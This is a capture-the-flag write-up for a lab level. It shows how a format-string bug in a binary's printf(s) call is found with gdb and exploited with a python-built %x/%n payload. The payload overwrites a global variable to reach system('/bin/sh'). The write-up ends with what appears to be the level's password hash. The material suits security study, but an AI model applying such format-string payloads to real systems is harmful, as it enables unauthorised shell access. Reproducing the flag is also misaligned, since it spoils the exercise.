## Flag3 README: Finding Flag3

After connection on our vm with:
```bash
ssh level3@localhost -p 4242
```
We finded a binary program called level1.
if we decompile it we got this
```C
int v()
{
  int result; // eax
  char s[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(s, 512, stdin);
  printf(s);
  result = m;
  if ( m == 64 )
  {
    fwrite("Wait what?!\n", 1u, 0xCu, stdout);
    return system("/bin/sh");
  }
  return result;
}
```
so we clearly understand that we need to change m to be equal to 64.
firstly we need to decompile it and search for m variable.
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
so we see that the decompilation didn't work
and it s more something like this
```C
result = RandomVariable
if randomvariable == 64 then we continue
```

And there is an known exploit with printf when you make in only print a variable like this :
```C
printf(foo)
```
to be safe he need to be like this :
```C
printf("%s", foo)
```

So let's exploit this.

The idea of the exploit is to print and mofify adress by adding sone %x and %n.
firstly we need to know when you are writing to the stack and at what adress.
So for exemple if if print  AAAA.%x.%x.%x.%x. this is the result :
AAAA.%x.%x.%x.%x.
AAAA.200.b7fd1ac0.b7ff37d0.41414120.
So lets decompile the stack after puting some AAAA inside it.

200 b7fd1ac0 b7ff37d0 is our sequence that are before in the stack. Let's verify it :
(gdb) x/32x $esp
0xbffff510:	0xbffff520	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff520:	0x41414141	0x2e78252e	0x252e7825	0x78252e78
0xbffff530:	0xbf000a2e	0xb7fde2d4	0xb7fde334	0x00000007
0xbffff540:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff588
0xbffff550:	0x00000040	0x00000b80	0x00000000	0xb7fde714
0xbffff560:	0x00000098	0x0000000b	0x00000000	0x00000000
0xbffff570:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff580:	0x00000000	0xb7fe765d	0xb7e3ebaf	0x080482bb

So we can see that our sequence is locating in here :
0xbffff510:	0xbffff520	0x00000200	0xb7fd1ac0	0xb7ff37d0


0xbffff520:	0x41414141 this is our 4 A

Then we will have to put the target adress (0x804988c) at the begining in the payload by replacing the AAAA it will be write in the stack at the positions 5 let's check it:

python -c 'print("\x8c\x98\x04\x08" + "%20x"*3 + "%n")'
<<< $(python -c 'print("\x8c\x98\x04\x08" + ".%x."*4)')
�.200..b7fd1ac0..b7ff37d0..804988c.

yep we can see that the last is our value puted in the front.

so now lets work with %n that will be writing the length of the string up to that point.

so what we need is to put a lot of charactere before it.And we know that the value we need to search is 64.
Si what will do is checking the value if we put not character then ading the caractere.

b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

